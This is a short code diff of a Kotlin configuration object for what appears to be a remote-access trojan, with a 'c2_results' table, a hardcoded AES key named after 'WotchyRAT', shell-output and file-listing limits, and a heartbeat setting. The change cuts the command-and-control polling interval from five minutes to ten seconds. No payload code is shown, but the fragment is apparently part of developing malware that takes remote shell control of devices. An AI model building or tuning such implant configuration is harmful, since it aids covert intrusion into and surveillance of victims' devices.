@@ -10,7 +10,7 @@ object Config {
     const val TABLE_RESULTS = "c2_results"
 
     val AES_KEY = "WotchyRAT2026!!!".toByteArray()
-    const val POLL_INTERVAL_MS = 300000L
+    const val POLL_INTERVAL_MS = 10000L
     const val MAX_SHELL_OUTPUT = 102400
     const val MAX_FILE_LIST = 500
     const val HEARTBEAT_INTERVAL_MS = 60000L
